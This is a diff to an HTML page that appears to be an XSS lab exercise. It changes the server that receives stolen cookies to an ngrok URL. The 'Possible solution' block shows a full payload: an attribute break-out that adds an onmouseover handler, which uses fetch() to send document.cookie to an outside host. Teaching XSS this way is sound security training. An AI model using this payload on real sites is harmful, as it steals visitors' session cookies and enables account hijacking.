@@ -43,13 +43,13 @@
 
     <ul>
         <li>Send the value of `document.cookie` to `GET
-            https://server.kevincunningham.co.uk/xss/four?cookie=COOKIE_PAYLOAD&name=YOUR_NAME`
+            https://3e36-51-52-158-78.ngrok-free.app/xss/four?cookie=COOKIE_PAYLOAD&name=YOUR_NAME`
         </li>
     </ul>
     <details>
         <summary>Possible solution</summary>
         <pre>
-        https://bbc.co.uk"onmouseover="fetch('https://server.kevincunningham.co.uk/xss/four?cookie=' + document.cookie)
+        https://bbc.co.uk"onmouseover="fetch('https://3e36-51-52-158-78.ngrok-free.app/xss/four?cookie=' + document.cookie)
     </pre>
     </details>
 
